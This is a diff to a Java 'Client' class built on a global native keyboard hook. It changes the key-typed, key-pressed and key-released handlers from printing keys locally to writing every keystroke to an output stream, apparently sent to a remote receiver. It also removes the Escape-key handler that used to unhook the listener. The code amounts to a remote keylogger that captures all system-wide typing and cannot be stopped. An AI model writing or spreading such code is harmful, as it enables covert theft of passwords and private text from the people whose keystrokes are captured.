@@ -23,32 +23,40 @@ public class Client implements NativeKeyListener, NativeMouseInputListener, Nati
  //native event listeners
  @Override
 public void nativeKeyTyped(NativeKeyEvent e) {
-    
-		System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
-	}
+    try{
+        objectOutputStream.writeUTF("Key Typed: "+NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+    catch(IOException f){
+        System.out.println(f);
+    }
+    }
  /*
  This method records all the pressed keys
  */
  @Override
 public void nativeKeyPressed(NativeKeyEvent e) {
-		System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
-
-		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
-            		try {
-                		GlobalScreen.unregisterNativeHook();
-            		} catch (NativeHookException nativeHookException) {
-                		nativeHookException.printStackTrace();
-            		}
-        	}
-	}
+    try{
+        objectOutputStream.writeUTF("Key Pressed: "+NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+    catch(IOException f){
+        System.out.println(f);
+    }
+        
+    }
  //qwerrty
  /*
  This method records all the released keys
  */
  @Override
  public void nativeKeyReleased(NativeKeyEvent e) {
-		System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
-	}
+    try{
+        objectOutputStream.writeUTF("Key Released: "+NativeKeyEvent.getKeyText(e.getKeyCode()));
+    }
+    catch(IOException f){
+        System.out.println(f);
+    }
+        
+    }
  @Override
  public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
  }
